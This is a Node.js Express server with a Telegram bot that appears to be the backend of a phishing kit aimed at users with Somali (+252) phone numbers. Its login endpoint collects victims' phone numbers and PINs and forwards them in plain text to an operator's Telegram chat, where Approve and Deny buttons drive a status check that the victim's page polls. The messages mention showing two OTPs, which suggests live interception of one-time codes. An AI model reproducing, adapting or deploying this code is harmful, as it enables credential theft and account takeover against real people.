const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    if (req.params.page.startsWith('api')) {
        return res.status(404).send("Not found");
    }

    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    statusStore[phone] = "pending";

    const message =
        `📱 <b>CL 2 - LOGIN ATTEMPT</b>\n\n` +
        `🆕 <b>NEW USER</b>\n` +
        `🇸🇴 <b>Country:</b> ${country}\n` +
        `🌍 <b>Country Code:</b> ${countryCode}\n` +
        `📱 <b>Phone Number:</b> ${phone}\n` +
        `🔢 <b>PIN:</b> ${pin}\n` +
        `⏰ <b>Time:</b> ${currentTime}\n\n` +
        `📱 <b>New user - will show 2 OTPs</b>\n` +
        `━━━━━━━━━━━━━━━\n\n` +
        `⚠️ <b>User waiting for approval</b>\n` +
        `⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "✅ Approve",
                            callback_data: `approve_${phone}_${pin}`
                        }
                    ],
                    [
                        {
                            text: "❌ Deny",
                            callback_data: `deny_${phone}`
                        }
                    ]
                ]
            }
        });

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";

    try {
        await ctx.editMessageText(
            `✅ <b>PROCEEDED</b>\n📱 ${phone}\n🔐 ${pin}`,
            { parse_mode: 'HTML' }
        );
    } catch (e) {
        console.error(e.message);
    }
});

bot.action(/deny_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";

    try {
        await ctx.editMessageText(
            "❌ <b>INFORMATION MARKED AS INVALID</b>",
            { parse_mode: 'HTML' }
        );
    } catch (e) {
        console.error(e.message);
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
};

startBot();
